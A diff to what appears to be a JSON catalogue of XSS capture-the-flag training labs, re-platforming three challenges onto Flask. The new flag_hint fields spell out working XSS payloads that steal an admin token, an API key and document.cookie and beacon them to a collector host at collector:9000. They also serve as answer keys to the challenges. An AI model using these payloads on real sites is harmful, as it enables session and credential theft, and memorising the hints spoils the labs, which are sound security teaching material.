@@ -635,23 +635,23 @@
         "slug": "reflected-xss-js-string-break-out",
         "title": "Reflected XSS in a JavaScript String Literal",
         "difficulty": "apprentice",
-        "description": "A checkout page reflects the ?promo= value inside a single-quoted JS string in an inline <script> block: var promo = 'REFLECTED_HERE'; document.getElementById('promo').innerText = promo;. Angle brackets are stripped server-side but single quotes and backslashes pass through untouched.",
-        "objective": "Break out of the JS string context to execute code that fetches /api/whoami with credentials and POSTs the JSON body to http://collector:9000/report.",
-        "flag_hint": "The /solve endpoint checks the OOB collector for a POST whose body contains the exact JSON returned by /api/whoami for the admin session; on match it emits the flag.",
+        "description": "A checkout page reflects the ?promo= value inside a single-quoted JS string in an inline <script> block: var promo = 'REFLECTED_HERE'; document.getElementById('promo').innerText = promo;. The only filter strips angle brackets, which does nothing in a JS-string context — single quotes and backslashes pass through, so a value beginning with a quote closes the literal and the rest runs as JavaScript.",
+        "objective": "Break out of the JS string to run code that credentialed-fetches /api/whoami (which discloses the admin token only to the admin cookie) and beacons it to http://collector:9000/report, then POST /solve with the token.",
+        "flag_hint": "Submit /?promo=';fetch('/api/whoami',{credentials:'include'}).then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?w='+encodeURIComponent(t)});// (URL-encoded) to POST /report; read the exfiltrated token via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
         "skills_taught": [
           "JavaScript-string-context payload construction",
           "breaking out of quotes without new tags",
           "understanding why HTML-only filters fail in JS contexts"
         ],
         "tech_stack": [
-          "Node 20",
-          "Express 4",
-          "EJS 3 template engine",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Python 3.12",
+          "Flask 3.1",
+          "gunicorn 23",
+          "vanilla JS (reflected into an inline JS-string literal)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
-        "inspired_by": "very common promo-code / referrer-code reflection pattern found across e-commerce triage tickets"
+        "inspired_by": "very common promo-code / referrer-code reflection pattern found across e-commerce triage tickets (re-platformed Express/EJS -> Flask; the JS-string-context lesson is framework-independent)"
       },
       {
         "slug": "dom-xss-innerhtml-jquery-html",
@@ -794,9 +794,9 @@
         "slug": "blind-xss-admin-user-agent-log",
         "title": "Blind XSS in Admin User-Agent Log Viewer",
         "difficulty": "practitioner",
-        "description": "An operations admin console renders the raw User-Agent string of every request in an HTML table cell using Jinja's |safe filter. The admin visits the log panel every 60 seconds; the panel is protected behind auth so blind delivery is the only option.",
-        "objective": "Send an HTTP request whose User-Agent header contains a blind-XSS payload; when the admin next visits the log panel the payload must fetch /admin/apikey and POST the response to http://collector:9000/report.",
-        "flag_hint": "OOB collector receives the API key; /solve compares against the current /admin/apikey value and prints the flag on match.",
+        "description": "An operations admin console records the raw User-Agent of every request and renders it into an admin-only log panel through an autoescape-disabled Jinja render (the |safe sink). The panel is auth-gated and never reflects the UA back to the sender, so delivery is blind: the payload lies dormant until the admin bot next loads the log.",
+        "objective": "Send an HTTP request whose User-Agent contains a blind-XSS payload; when the admin bot loads the log panel it must fetch the admin-only /admin/apikey and beacon it to http://collector:9000/report, then POST /solve with the key.",
+        "flag_hint": "Send GET / with User-Agent: <img src=x onerror=\"fetch('/admin/apikey').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?k='+encodeURIComponent(t)})\">; read the exfiltrated key via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}. /admin/logs and /admin/apikey are 403 for you.",
         "skills_taught": [
           "blind-XSS methodology and canary payloads",
           "HTTP header injection as a stored sink",
@@ -804,14 +804,13 @@
         ],
         "tech_stack": [
           "Python 3.12",
-          "FastAPI 0.115",
-          "Jinja2 3.1 with |safe on the log-cell template",
-          "Redis 7 for log store",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Flask 3.1",
+          "gunicorn 23",
+          "Jinja2 (autoescape disabled on the log-cell render)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
-        "inspired_by": "XSSHunter methodology (Matt Bryant) and countless admin-panel blind-XSS writeups on HackerOne 2020-2024"
+        "inspired_by": "XSSHunter methodology (Matt Bryant) and countless admin-panel blind-XSS writeups on HackerOne 2020-2024 (re-platformed FastAPI+Redis -> Flask + in-process log store; the header-sink + |safe lesson is what matters)"
       },
       {
         "slug": "self-xss-csrf-profile-chain",
@@ -864,8 +863,8 @@
         "title": "iframe srcdoc Attribute Injection Bypass",
         "difficulty": "practitioner",
         "description": "A rich-post renderer using Bleach with a misconfigured allowlist permits <iframe> with the srcdoc attribute. The sanitiser inspects iframe children but forgets that srcdoc is itself an HTML/JS document parsed in an inherited-origin about:srcdoc context.",
-        "objective": "Post content that produces an <iframe srcdoc='...'> whose inner document runs script and exfiltrates the admin's document.cookie to the OOB collector.",
-        "flag_hint": "OOB collector receives the cookie; /solve prints the flag on match.",
+        "objective": "Post a note producing an <iframe srcdoc=\"...\"> whose inner script runs in the about:srcdoc (inherited-origin) context and exfiltrates the admin's non-HttpOnly document.cookie to http://collector:9000/report when the admin bot loads the feed, then POST /solve.",
+        "flag_hint": "POST /posts {\"body\":\"<iframe srcdoc=\\\"<script>new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)</script>\\\"></iframe>\"}; read the exfiltrated cookie via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}. /admin/feed is 403 for you.",
         "skills_taught": [
           "srcdoc attribute payloads",
           "about:srcdoc origin inheritance",
@@ -873,11 +872,11 @@
         ],
         "tech_stack": [
           "Python 3.12",
-          "Flask 3.0",
-          "Bleach 6 with iframe + srcdoc in allowed_attributes",
-          "nginx 1.27",
-          "Puppeteer 22 admin bot",
-          "Node 20 OOB collector"
+          "Flask 3.1",
+          "gunicorn 23",
+          "Bleach 6.2 (iframe+srcdoc in allowed_attributes)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
         "inspired_by": "Bleach and DOMPurify configuration pitfalls documented in the Mozilla and Cure53 advisories 2022-2024"
       },
